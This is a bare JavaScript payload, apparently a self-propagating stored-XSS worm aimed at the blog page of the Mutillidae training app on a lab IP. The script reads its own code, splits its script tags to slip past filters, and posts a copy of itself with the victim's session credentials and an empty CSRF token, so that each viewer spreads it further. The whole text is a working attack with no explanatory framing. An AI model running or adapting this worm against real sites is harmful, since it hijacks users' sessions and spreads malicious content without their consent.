<script id=myscript>

var scripttext = document.getElementById("myscript").innerHTML;
var scripttag1 ="<scr".concat("ipt");
scripttag1 = scripttag1.concat(" id=myscript");
scripttag1 = scripttag1.concat(">");
var scripttag2 ="</scr".concat("ipt>");
scripttext = escape(scripttext);
scripttext = scripttag1.concat(scripttext);
scripttext = scripttext.concat(scripttag2);
var url = "http://192.168.244.129/mutillidae/index.php?page=add-to-your-blog.php";
var params = "blog_entry=";
params = params.concat(scripttext);
params = params.concat("&csrf-token=&add-to-your-blog-php-submit-button=Save+Blog+Entry");
var xhr = new XMLHttpRequest();
xhr.open("POST", url, true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

xhr.send(params);
</script>